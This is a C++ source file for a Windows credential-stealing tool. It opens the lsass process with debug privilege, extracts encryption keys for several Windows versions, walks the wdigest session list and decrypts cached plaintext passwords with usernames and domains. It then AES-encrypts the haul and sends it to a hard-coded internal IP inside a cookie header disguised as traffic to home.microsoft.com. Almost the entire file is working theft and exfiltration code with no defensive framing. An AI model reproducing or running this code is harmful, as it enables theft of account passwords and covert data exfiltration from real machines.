


char* toChar(const wchar_t* _wchar) {
    int len = WideCharToMultiByte(CP_ACP, 0, _wchar, -1, NULL, 0, NULL, NULL);
    char* _char = new char[len];
    WideCharToMultiByte(CP_ACP, 0, _wchar, -1, _char, len, NULL, NULL);   
    return _char;
}


std::string string_to_hex(const std::string& input)
{
    static const char* const lut = "0123456789ABCDEF";
    size_t len = input.length();

    std::string output;
    output.reserve(2 * len);
    for (size_t i = 0; i < len; ++i)
    {
        const unsigned char c = input[i];
        output.push_back(lut[c >> 4]);
        output.push_back(lut[c & 15]);
    }
    return output;
}

char * getcomputername_s(){

wchar_t wzComputerName[256];
DWORD dwSize = sizeof(wzComputerName)/sizeof(wzComputerName[0]);
GetComputerName(wzComputerName, &dwSize);
char * comname=toChar(wzComputerName);
return comname;
}



std::string hex_to_string(const std::string& input)
{
    static const char* const lut = "0123456789ABCDEF";
    size_t len = input.length();
    if (len & 1) throw std::invalid_argument("odd length");

    std::string output;
    output.reserve(len / 2);
    for (size_t i = 0; i < len; i += 2)
    {
        char a = input[i];
        const char* p = std::lower_bound(lut, lut + 16, a);
        if (*p != a) throw std::invalid_argument("not a hex digit");

        char b = input[i + 1];
        const char* q = std::lower_bound(lut, lut + 16, b);
        if (*q != b) throw std::invalid_argument("not a hex digit");

        output.push_back(((p - lut) << 4) | (q - lut));
    }
    return output;
}


void Convert(const char *strIn, char *strOut, int sourceCodepage = CP_ACP, int targetCodepage = CP_UTF8)
{
	int len = lstrlenA(strIn);
	int unicodeLen = MultiByteToWideChar(sourceCodepage, 0, strIn, -1, NULL, 0);

	wchar_t* pUnicode;
	pUnicode = new wchar_t[unicodeLen + 1];
	memset(pUnicode, 0, (unicodeLen + 1)*sizeof(wchar_t));
	MultiByteToWideChar(sourceCodepage, 0, strIn, -1, (LPWSTR)pUnicode, unicodeLen);

	BYTE * pTargetData = NULL;
	int targetLen = WideCharToMultiByte(targetCodepage, 0, (LPWSTR)pUnicode, -1,/*(char *)pTargetData*/NULL, 0, NULL, NULL);
	pTargetData = new BYTE[targetLen + 1];
	memset(pTargetData, 0, sizeof(char)*(targetLen + 1));
	WideCharToMultiByte(targetCodepage, 0, (LPWSTR)pUnicode, -1, (char *)pTargetData, targetLen, NULL, NULL);

	//lstrcpy(strOut, (char*)pTargetData);
	lstrcpynA(strOut, (char*)pTargetData, targetLen + 1);
	delete pUnicode;
	delete pTargetData;
}


string http(string pcszUrl,string SendHeader){
	const char * cdata=SendHeader.c_str();
	//const char * data=data.c_str();

	EdUrlParser* url = EdUrlParser::parseUrl(pcszUrl);
	string  h= url->hostName;
	string p=url->path;
	

	std::wstring p_stemp = s2ws(p);
	std::wstring h_stemp = s2ws(h);
    std::wstring head_temp=s2ws(SendHeader);
	LPCWSTR host = h_stemp.c_str();
	LPCWSTR path=p_stemp.c_str();
	LPCWSTR headers=head_temp.c_str();

    BOOL bResults = FALSE;
	string buffer;
	DWORD dwSize = 0;
	string error = "ERROR";
	LPSTR pszOutBuffer;
	DWORD dwDownloaded = 0;


	HINTERNET hSession = NULL,
		hConnect = NULL,
		hRequest = NULL;

	hSession=WinHttpOpen(_T("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_5_8) AppleWebKit/534.31 (KHTML, like Gecko) Chrome/13.0.748.0 Safari/534.31"),
		WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
		WINHTTP_NO_PROXY_NAME,
		WINHTTP_NO_PROXY_BYPASS, 0);

	if (hSession == NULL) {
		printf("ERROR WinHttpOpen %i\n", GetLastError());
	
	}


	
	if (hSession)
		hConnect = WinHttpConnect(hSession, host, INTERNET_DEFAULT_HTTP_PORT, 0);


	if (hConnect == NULL) {
		printf("ERROR WinHttpConnect %i\n", GetLastError());
		
		if (hSession) WinHttpCloseHandle(hSession);
		 
	}
	
	if (hConnect)
		hRequest = WinHttpOpenRequest(hConnect, L"GET", path, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);

	
	SIZE_T len = lstrlenW(headers);
	WinHttpAddRequestHeaders(hRequest, headers, DWORD(len), WINHTTP_ADDREQ_FLAG_ADD);
	
	if (hRequest)
		bResults = WinHttpSendRequest(hRequest,
			WINHTTP_NO_ADDITIONAL_HEADERS, 0,
			WINHTTP_NO_REQUEST_DATA, 0,
			0, 0);
		
	if (bResults)
		bResults = WinHttpReceiveResponse(hRequest, NULL);
	if (bResults)
	{
		do
		{
			dwSize = 0;
			if (!WinHttpQueryDataAvailable(hRequest, &dwSize))
				return error;
			pszOutBuffer = (char*)malloc(dwSize + 1);
			if (!pszOutBuffer)
			{
				return error;
				dwSize = 0;
			}
			else
			{
				ZeroMemory(pszOutBuffer, dwSize + 1);
				if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer,
					dwSize, &dwDownloaded))
					return error;
				else
					buffer += pszOutBuffer;
				free(pszOutBuffer);
			}
		} while (dwSize > 0);
	}
	if (!bResults)
		return error;
	if (hRequest) WinHttpCloseHandle(hRequest);
	if (hConnect) WinHttpCloseHandle(hConnect);
	if (hSession) WinHttpCloseHandle(hSession);
	return buffer;

}


// Hunts through wdigest and extracts credentials to be decrypted
int FindCredentials(HANDLE hLsass, char* wdigestMem) {

	KIWI_WDIGEST_LIST_ENTRY entry;
	DWORD logSessListSigOffset, logSessListOffset;
	unsigned char* logSessListAddr;
	unsigned char* wdigestLocal;
	unsigned char* llCurrent;
	unsigned char passDecrypted[1024];
	
	//unsigned char* passDecrypted;

	// Load wdigest.dll locally to avoid multiple ReadProcessMemory calls into lsass
	wdigestLocal = (unsigned char*)LoadLibraryA("wdigest.dll");
	if (wdigestLocal == NULL) {
		printf("[x] Error: Could not load wdigest.dll into local process\n");
		return 1;
	}
	printf("[*] Loaded wdigest.dll at address %p\n", wdigestLocal);

	// Search for l_LogSessList signature within wdigest.dll and grab the offset
	logSessListSigOffset = SearchPattern(wdigestLocal, logSessListSig, sizeof(logSessListSig));
	if (logSessListSigOffset == 0) {
		printf("[x] Error: Could not find l_LogSessList signature\n");
		return 1;
	}
	printf("[*] l_LogSessList offset found as %d\n", logSessListSigOffset);

	// Read memory offset to l_LogSessList from a "lea reg, [l_LogSessList]" asm
	ReadFromLsass(hLsass, wdigestMem + logSessListSigOffset - 4, &logSessListOffset, sizeof(DWORD));

	// Read pointer at address to get the true memory location of l_LogSessList
	ReadFromLsass(hLsass, wdigestMem + logSessListSigOffset + logSessListOffset, &logSessListAddr, sizeof(char*));

	printf("[*] l_LogSessList found at address %p\n", logSessListAddr);
	printf("[*] Credentials incoming... (hopefully)\n\n");

	// Read first entry from linked list
	ReadFromLsass(hLsass, logSessListAddr, &entry, sizeof(KIWI_WDIGEST_LIST_ENTRY));

	llCurrent = (unsigned char*)entry.This;
		

	do {
		memset(&entry, 0, sizeof(entry));

		// Read entry from linked list
		ReadFromLsass(hLsass, llCurrent, &entry, sizeof(KIWI_WDIGEST_LIST_ENTRY));

		if (entry.UsageCount == 1) {

			UNICODE_STRING* username = ExtractUnicodeString(hLsass, (char*)llCurrent + USERNAME_OFFSET);
			UNICODE_STRING * hostname = ExtractUnicodeString(hLsass, (char*)llCurrent + HOSTNAME_OFFSET);
			UNICODE_STRING * password = ExtractUnicodeString(hLsass, (char*)llCurrent + PASSWORD_OFFSET);
			const int MAX_BUF = 1000;
			char* Buffer_str = (char *)malloc(MAX_BUF);
			ZeroMemory(Buffer_str,MAX_BUF);
		

			if (password->Length != 0 &&password->Length <=64) {
				//FILE *file;
				time_t ora;
				time(&ora);

				sprintf(Buffer_str+strlen(Buffer_str), "%s", asctime(localtime(&ora)));
				sprintf(Buffer_str+strlen(Buffer_str),"[-->] ComputName: %s\n",getcomputername_s());
				if (username != NULL && username->Length != 0) {
				sprintf(Buffer_str+strlen(Buffer_str), "[-->] Username: %ls\n", username->Buffer);

				
			}

			if (hostname != NULL && hostname->Length != 0) {
		

				sprintf(Buffer_str+strlen(Buffer_str), "[-->] Doman: %ls\n", hostname->Buffer);
			}		
				if (DecryptCredentials((char*)password->Buffer, password->MaximumLength, passDecrypted, sizeof(passDecrypted)) > 0) {
			
					wchar_t * tmp_str=(wchar_t *)passDecrypted;
					char *tmp_char=UTF16ToChar(tmp_str);
					
					sprintf(Buffer_str+strlen(Buffer_str), "[-->] Password: %s\n", tmp_char);
			
				}
				else{
					sprintf(Buffer_str+strlen(Buffer_str),"\n");
					
				
				}
				
			sprintf(Buffer_str+strlen(Buffer_str),"\n");

			}
			string aesEncryptstr,aesDecryptstr;
			string Buffer_string(Buffer_str);
		

		aesEncryptstr=EncryptionAES(Buffer_string);
		if(aesEncryptstr.length()>40){
			
			aesDecryptstr =DecryptionAES(aesEncryptstr);


			string d=urlEscape(aesEncryptstr);
			string sendHeader;
			string retheader;
			string retData;
			sendHeader="Host: home.microsoft.com\r\n";
			sendHeader+="Content-type: application/x-www-form-urlencoded\r\n";
			sendHeader+="Cookie: Token=";
			sendHeader+=d+"\r\n";
			sendHeader+="Referer: http://home.microsoft.com/#home";

			
			retData=http("http://192.168.3.5/",sendHeader);

			
	char * str = new char[retData.length() + 1];
	//UTF8->ANSI
	Convert(retData.c_str(), str, CP_UTF8, CP_ACP);

	cout << str << endl;
	delete[] str;
			
			}
		
		free(Buffer_str);
			FreeUnicodeString(username);
			FreeUnicodeString(hostname);
			FreeUnicodeString(password);
			
		}
	
	
		llCurrent = (unsigned char*)entry.Flink;
		
	} while (llCurrent != logSessListAddr);
	


	return 0;
}



int GetLsassPid() {

	PROCESSENTRY32 entry;
	entry.dwSize = sizeof(PROCESSENTRY32);

	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

	if (Process32First(hSnapshot, &entry)) {
		while (Process32Next(hSnapshot, &entry)) {
			if (wcscmp(entry.szExeFile, L"lsass.exe") == 0) {
				return entry.th32ProcessID;
			}
		}
	}

	CloseHandle(hSnapshot);
	return 0;
}

BOOL EnableDebugPrivilege(BOOL fEnable)
{
	BOOL fOk = FALSE;
	HANDLE hToken;
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken))
	{
		TOKEN_PRIVILEGES tp;
		tp.PrivilegeCount = 1;
		LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid);
		tp.Privileges[0].Attributes = fEnable ? SE_PRIVILEGE_ENABLED : 0;
		AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
		fOk = (GetLastError() == ERROR_SUCCESS);
		CloseHandle(hToken);
	}
	return(fOk);
}



int GetOSVersion()
{
	typedef void(__stdcall*NTPROC)(DWORD*, DWORD*, DWORD*);
	HINSTANCE hinst = LoadLibrary(L"ntdll.dll");
	DWORD dwMajor, dwMinor, dwBuildNumber;
	NTPROC proc = (NTPROC)GetProcAddress(hinst, "RtlGetNtVersionNumbers");
	proc(&dwMajor, &dwMinor, &dwBuildNumber);

	if (dwMajor == 10 && dwMinor == 0 && dwBuildNumber < 18362 ) {
	printf("[*] OS: Windows 10 \n");
		return 3;
	}

    if (dwMajor == 10 && dwMinor == 0 && dwBuildNumber > 18360) {
      printf("[*] OS: Windows 10 1903\n");
        return 4;
    }
	SYSTEM_INFO info;
	GetSystemInfo(&info);
	OSVERSIONINFOEX os;
	os.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
	if (GetVersionEx((OSVERSIONINFO *)&os))
	{
		switch (os.dwMajorVersion)
		{
		case 6:
			switch (os.dwMinorVersion)
			{
			case 0:
				if (os.wProductType == VER_NT_WORKSTATION) {
					printf("[*] OS: Windows Vista\n");
					return 1;
				}

				else {
				printf("[*] OS: Windows Server 2008\n");
					return 1;
				}

			case 1:
				if (os.wProductType == VER_NT_WORKSTATION)
					printf("[*] OS: Windows 7\n");
				else
					printf("[*] OS:Windows Windows Server 2008 R2\n");
				return 1;

			case 2:
				if (os.wProductType == VER_NT_WORKSTATION)
					printf("[*] OS: Windows 8\n");
				else
					printf("[*] OS: Windows Server 2012\n");
				return 2;
			}
			break;
		default:
			printf("[!] Too old\n");

		}
	}
	else
		printf("[!] Error\n");
	return 0;
}




int main()
{
	/*
	printf("Support:\n");
	printf(" - Win7 x64/Windows Server 2008 x64/Windows Server 2008R2 x64\n");
	printf(" - Win8 x64/Windows Server 2012 x64/Windows Server 2012R2 x64\n");
	printf(" - Win10_1507(and before 1903) x64\n\n");
	*/
	UseLogonCredential();
	if (!EnableDebugPrivilege(TRUE))
	{
		printf("[!]AdjustTokenPrivileges Failed.<%d>\n", GetLastError());
	}

	HANDLE hLsass;
	HMODULE lsassDll[1024];
	DWORD bytesReturned;
	char modName[MAX_PATH];
	char* lsass = NULL, *lsasrv = NULL, *wdigest = NULL;

	// Open up a PROCESS_QUERY_INFORMATION | PROCESS_VM_READ handle to lsass process
	hLsass = GrabLsassHandle(GetLsassPid());
	if (hLsass == INVALID_HANDLE_VALUE) {
		printf("[x] Error: Could not open handle to lsass process\n");
		return 1;
	}

	// Enumerate all loaded modules within lsass process
	if (EnumProcessModules(hLsass, lsassDll, sizeof(lsassDll), &bytesReturned)) {

		// For each DLL address, get its name so we can find what we are looking for
		for (int i = 0; i < bytesReturned / sizeof(HMODULE); i++) {
			GetModuleFileNameExA(hLsass, lsassDll[i], modName, sizeof(modName));

			// Find DLL's we want to hunt for signatures within
			if (strstr(modName, "lsass.exe") != (char*)0)
				lsass = (char*)lsassDll[i];
			else if (strstr(modName, "wdigest.DLL") != (char*)0)
				wdigest = (char*)lsassDll[i];
			else if (strstr(modName, "lsasrv.dll") != (char*)0)
				lsasrv = (char*)lsassDll[i];
		}
	}
	else
	{
		printf("[!]Error code of EnumProcessModules():%d\n", GetLastError());
		return 0;
	}

	// Make sure we have all the DLLs that we require
	if (lsass == NULL || wdigest == NULL || lsasrv == NULL) {
		printf("[x] Error: Could not find all DLL's in LSASS :(\n");
		return 1;
	}
	/*
	printf("[*] lsass.exe found at %p\n", lsass);
	printf("[*] wdigest.dll found at %p\n", wdigest);
	printf("[*] lsasrv.dll found at %p\n", lsasrv);
	
	*/
	// Now we need to search through lsass for the AES, 3DES, and IV values
	int flag = GetOSVersion();
	if (flag == 0)
		return 0;

	else if (flag == 1) {
		if (FindKeysOnWin7(hLsass, lsasrv) != 0) {

			printf("[x] Error: Could not find keys in lsass\n");
			return 1;
		}
	}

	else if (flag == 2) {
		BYTE keyIVSig[] = { 0x83, 0x64, 0x24, 0x30, 0x00, 0x44, 0x8b, 0x4d, 0xd8, 0x48, 0x8b, 0x0d };
		if (FindKeysOnWin8(hLsass, lsasrv) != 0) {
			printf("[x] Error: Could not find keys in lsass\n");
			return 1;
		}
	}

	else if (flag == 3) {
		//For Win10_1507
		if (FindKeysOnWin10(hLsass, lsasrv) != 0) {
			printf("[x] Error: Could not find keys in lsass\n");
			return 1;
		}
	}

    else if (flag == 4) {
        //For Win10_1903
        if (FindKeysOnWin10_1903(hLsass, lsasrv) != 0) {
            printf("[x] Error: Could not find keys in lsass\n");
            return 1;
        }
    }
	// With keys extracted, we can extract credentials from memory
	if (FindCredentials(hLsass, wdigest) != 0) {
		printf("[x] Error: Could not find credentials in lsass\n");
		return 1;
	}
}
